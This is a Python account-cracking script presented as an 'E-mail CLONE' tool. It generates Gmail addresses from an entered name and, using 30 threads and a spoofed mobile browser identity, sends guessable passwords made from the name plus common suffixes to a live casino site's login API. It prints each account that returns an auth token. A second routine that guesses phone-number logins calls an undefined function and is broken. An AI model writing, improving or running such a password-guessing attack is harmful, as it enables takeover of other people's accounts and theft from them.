import requests
import random
import sys
import os
import time
import string
import json
from concurrent.futures import ThreadPoolExecutor

ok = []
loop = []
id = []

W = '\x1b[1;97m'
R = '\x1b[1;91m'
G = '\x1b[1;92m'
Y = '\x1b[1;93m'
B = '\x1b[1;94m'
P = '\x1b[1;95m'
nb = '\x1b[1;96m'
A = '\x1b[1;90m'

logox = ("""\x1b[1;92m
▬ \x1b[1;92m███████ ██    ██ ██   ██  █████        \x1b[33;1m▬▬▬▬▬▬▬▬▬\x1b[1;92m
▬ \x1b[1;92m██      ██    ██ ██   ██ ██   ██      \x1b[33;1m█ V : 0.1 █\x1b[1;92m
▬ \x1b[1;92m███████ ██    ██ ███████ ███████ 
▬\x1b[1;92m     ██ ██    ██ ██   ██ ██   ██ 
▬ \x1b[1;92m███████  ██████  ██   ██ ██   ██ 
▬\x1b[1;92m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\x1b[1;37m
\x1b[1;97m Owner   :            MD JAKARIA FIAD      █    
\x1b[1;32m Coder:            Sifat                   █
\x1b[1;97m Github  :            phinerx              █
\x1b[1;32m Whatsapp:            +880179102****       █
\x1b[1;97m Tool    :            E-mail  CLONE        █
\x1b[1;32m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\x1b[1;37m""")

def logo():
    print(logox)

def animate_loading():
    sys.stdout.write('\r [>] Loading')
    for i in range(8):
        sys.stdout.write('.')
        sys.stdout.flush()
        time.sleep(0.3)
    sys.stdout.write('\n')

def num():
    os.system('clear')
    logo()
    lim = int(input(' [>] Limit : '))
    print('==================================================')
    animate_loading()
    
    for _ in range(lim):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user = f"017{nmp}"
        id.append(user)
    
    with ThreadPoolExecutor(max_workers=30) as SaoUm:
        for love in id:
            user = love
            six = user[3:9]
            pas = [six, user]
            SaoUm.submit(graph, user, pas)
    
    print('Done')

def user():
    pas = []
    os.system('clear')
    logo()
    name = input(' [>] Name : ')
    lim = int(input(' [>] Limit : '))
    print('==================================================')
    
    for suffix in ['12', '123', '1234', '12345', '@', '@12@##', '@34@##', '92@##', '92@', '12@', '34@', '@@##', '@@', '@@#', '693', '@']:
        pas.append(name + suffix)
    
    with ThreadPoolExecutor(max_workers=30) as SaoUm:
        for _ in range(lim):
            nmp = ''.join(random.choice(string.digits) for _ in range(3))
            user = f"{name}{_}@gmail.com"
            id.append(user)
            SaoUm.submit(clon, user, pas)
    
    print('Done')

def clon(user, pas):
    try:
        rn = random.choice([B, nb, Y, P])
        sys.stdout.write(f'\r{W} [{rn}{user}{W}] {Y} {len(loop)}/{len(id)} {Y}<> {G}OK-{len(ok)}\r')
        sys.stdout.flush()
        
        for pw in pas:
            headers = {
                'authority': 'banger.casino',
                'accept': '*/*',
                'accept-language': 'en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control': 'no-cache',
                'content-type': 'application/json',
                'origin': 'https://banger.casino',
                'pragma': 'no-cache',
                'referer': 'https://banger.casino/?popup=sign-in',
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'user-agent': 'Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36'
            }
            json_data = {
                'login': user,
                'password': pw
            }
            response = requests.post('https://banger.casino/v1/auth/login', headers=headers, json=json_data).json()
            
            if 'authToken' in response:
                print(f'\r{G} [SUCCESS] {user} {W}|{G} {pw}')
                ok.append(user)
            elif 'Failed' in response:
                pass
        
        loop.append(user)
    except Exception as e:
        print(f'\nError: {e}')
        time.sleep(10)
        raise

if __name__ == '__main__':
    animate_loading()
    user()
